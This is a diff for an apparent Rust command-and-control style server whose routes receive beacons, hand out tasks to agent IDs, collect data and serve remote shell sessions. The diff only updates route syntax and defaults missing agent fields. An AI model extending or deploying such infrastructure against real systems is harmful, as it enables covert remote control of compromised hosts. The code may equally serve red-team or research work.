@@ -129,9 +129,9 @@ async fn main() {
         .route("/logs", get(logs_handler))
         .route("/collect", post(collect_handler))
         .route("/beacon", post(beacon_handler))
-        .route("/task/{agent_id}", get(task_handler))
-        .route("/task/{agent_id}", post(task_push_handler))
-        .route("/shell/{session_id}", get(shell_handler))
+        .route("/task/:agent_id", get(task_handler))
+        .route("/task/:agent_id", post(task_push_handler))
+        .route("/shell/:session_id", get(shell_handler))
         .route("/admin/sessions", get(admin_sessions_handler))
         .route("/admin/agents", get(admin_agents_handler))
         .layer(CorsLayer::permissive())
@@ -270,7 +270,7 @@ async fn beacon_handler(
         .and_then(|v| v.to_str().ok())
         .unwrap_or("unknown");
 
-    let payload: BeaconPayload = serde_json::from_slice(&body).unwrap_or(BeaconPayload {
+    let mut payload: BeaconPayload = serde_json::from_slice(&body).unwrap_or(BeaconPayload {
         agent_id: agent_id.to_string(),
         agent_role: agent_role.to_string(),
         hostname: String::new(),
@@ -279,6 +279,12 @@ async fn beacon_handler(
         version: String::new(),
         extra: std::collections::HashMap::new(),
     });
+    if payload.agent_id.is_empty() {
+        payload.agent_id = agent_id.to_string();
+    }
+    if payload.agent_role.is_empty() {
+        payload.agent_role = agent_role.to_string();
+    }
 
     {
         let db = state.db.lock().await;
